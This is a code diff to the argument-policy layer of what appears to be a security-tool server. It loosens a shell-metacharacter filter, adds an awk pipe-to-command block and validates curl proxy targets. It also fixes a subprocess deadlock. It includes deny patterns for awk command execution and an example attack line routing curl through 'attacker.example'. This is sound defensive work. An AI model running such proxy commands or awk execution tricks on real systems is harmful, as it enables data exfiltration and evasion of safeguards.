@@ -202,11 +202,16 @@ SYSTEM_UTILITIES: frozenset[str] = frozenset(
 )
 
 # Dangerous shell metacharacters that must not appear in arguments.
-# Only block shell injection vectors: ; & | ` $( ${
-# Note: > < $ are NOT blocked — no shell is used (create_subprocess_exec),
-# so they are harmless literals.  Tools need $ for regex anchors (grep 'root$')
-# and field references (awk '{print $1}'), and > < for XML/comparisons.
-_DANGEROUS_PATTERNS = re.compile(r"[;&|`]|\$[({]")
+# Block the command-substitution and pipe vectors: | ` $( ${
+# No shell is ever used (create_subprocess_exec, never shell=True), so ; & > < $
+# are harmless literals passed straight to the tool — and tools legitimately need
+# them: ';'/'&' in URL query strings ("?a=1&b=2"), '$' for regex anchors
+# (grep 'root$') and awk fields ('{print $1}'), and '>'/'<' for XML/comparisons.
+# Pipe '|' stays blocked so multi-command piping must go through run_pipeline;
+# backtick and $(/${ stay blocked as command substitution. This keeps the
+# planner (guided_assessment, which allows '&'/';' in URLs) and the executor
+# consistent — see the audit #4 layering note.
+_DANGEROUS_PATTERNS = re.compile(r"[|`]|\$[({]")
 
 # Execution policy — restrict *what* tools can do, not just *which* tools run
 
@@ -241,6 +246,7 @@ _NC_BLOCKED_FLAGS: list[tuple[re.Pattern[str], str]] = [
 _AWK_BLOCKED_FLAGS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"system\s*\(", re.IGNORECASE), "awk: system() command execution"),
     (re.compile(r"\|\s*getline", re.IGNORECASE), "awk: pipe to getline"),
+    (re.compile(r"\|&?\s*[\"']", re.IGNORECASE), 'awk: pipe/coprocess to command (print | "cmd")'),
     (re.compile(r"^-f"), "awk: -f program file (uninspected script execution)"),
     (re.compile(r"^--file(?:$|=)"), "awk: --file program file (uninspected script execution)"),
     (re.compile(r"^--source(?:$|=)"), "awk: --source inline program (uninspected script execution)"),
@@ -1066,6 +1072,33 @@ def _network_target_host(value: str) -> str:
     return clean
 
 
+# Proxy / upstream-connect flags whose VALUE is a real network destination.
+# Their value is [scheme://][user:pass@]host[:port][/path]; the host must pass
+# the same private/loopback policy as a target, otherwise an external proxy
+# laundered as "host/path.ext" slips past the local-file heuristic in
+# _is_local_path (e.g. curl -x attacker.example/p.txt http://10.0.0.1/).
+_PROXY_FLAGS: frozenset[str] = frozenset({"-x", "--proxy", "--preproxy", "-proxy", "-http-proxy", "--proxy-host"})
+_ATTACHED_PROXY_FLAGS: frozenset[str] = frozenset({"-x"})
+
+
+def _validate_proxy_target(value: str) -> None:
+    """Raise if the host inside a proxy-flag *value* is not private/loopback.
+
+    Only validates when the extracted host actually looks like a network target,
+    so benign non-host values never produce a spurious block. No-op when external
+    targets are allowed (the caller already returned in that case).
+    """
+    stripped = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", value)
+    if "@" in stripped:
+        stripped = stripped.rsplit("@", 1)[1]
+    host = _network_target_host(stripped)
+    if host and _looks_like_target(host) and not _is_safe_target(host):
+        raise ValueError(
+            f"Blocked by policy: proxy target '{value}' is not in a private/local "
+            "range (set CYBERSEC_MCP_ALLOW_EXTERNAL=1 to allow external proxies)"
+        )
+
+
 # ---------------------------------------------------------------------------
 # Write-destination guard
 # ---------------------------------------------------------------------------
@@ -1128,10 +1161,9 @@ def _normalize_write_path(path: str) -> str | None:
         return None
     if re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", path):
         return None  # URL, not a local path
-    expanded = os.path.expanduser(path)
-    if not os.path.isabs(expanded):
-        expanded = os.path.join(os.getcwd(), expanded)
-    return os.path.normpath(expanded)
+    # os.path.join ignores cwd when the expanded path is already absolute, so
+    # this covers both cases without a separate isabs branch.
+    return os.path.normpath(os.path.join(os.getcwd(), os.path.expanduser(path)))
 
 
 def _is_sensitive_write_target(path: str) -> bool:
@@ -1288,6 +1320,24 @@ def check_policy(tool_name: str, arg_list: list[str]) -> None:
             if _looks_like_target(server):
                 value = server
             i += 1
+        elif arg in _PROXY_FLAGS and i + 1 < len(arg_list):
+            _validate_proxy_target(arg_list[i + 1])
+            i += 2
+            continue
+        elif any(arg.startswith(flag) and arg != flag for flag in _ATTACHED_PROXY_FLAGS):
+            for flag in _ATTACHED_PROXY_FLAGS:
+                if arg.startswith(flag) and arg != flag:
+                    value = arg[len(flag) :]
+                    if value.startswith("="):
+                        value = value[1:]
+                    _validate_proxy_target(value)
+                    break
+            i += 1
+            continue
+        elif "=" in arg and arg.split("=", 1)[0] in _PROXY_FLAGS:
+            _validate_proxy_target(arg.split("=", 1)[1])
+            i += 1
+            continue
         elif not arg.startswith("-") and not arg.startswith("/"):
             # Positional arg — only validate if it looks like a network target.
             # Skip bare numbers (port/timeout values for flags like -p 80, -T 4)
@@ -1434,16 +1484,17 @@ async def _bounded_communicate(
             except Exception:
                 pass
 
-    tasks = [
-        asyncio.create_task(_drain(process.stdout, stdout_truncated)),
-        asyncio.create_task(_drain(process.stderr, stderr_truncated)),
-    ]
+    # Drain both pipes concurrently; write stdin alongside so a child that
+    # blocks on a full stdout pipe while we block on its stdin can't deadlock.
+    stdout_task = asyncio.create_task(_drain(process.stdout, stdout_truncated))
+    stderr_task = asyncio.create_task(_drain(process.stderr, stderr_truncated))
+    writer_task: asyncio.Task[None] | None = None
     if input_bytes is not None and process.stdin is not None:
-        tasks.append(asyncio.create_task(_write_stdin()))
+        writer_task = asyncio.create_task(_write_stdin())
 
-    results = await asyncio.gather(*tasks)
-    stdout_bytes = results[0]
-    stderr_bytes = results[1]
+    stdout_bytes, stderr_bytes = await asyncio.gather(stdout_task, stderr_task)
+    if writer_task is not None:
+        await writer_task
 
     await process.wait()
 
@@ -1506,7 +1557,7 @@ def sanitize_args(args: str) -> list[str]:
 
     # Check for dangerous shell metacharacters before parsing
     if _DANGEROUS_PATTERNS.search(args):
-        raise ValueError(f"Arguments contain blocked shell metacharacters: {args!r}. Blocked patterns: ; & | ` $( ${{")
+        raise ValueError(f"Arguments contain blocked shell metacharacters: {args!r}. Blocked patterns: | ` $( ${{")
 
     try:
         parsed = shlex.split(args)
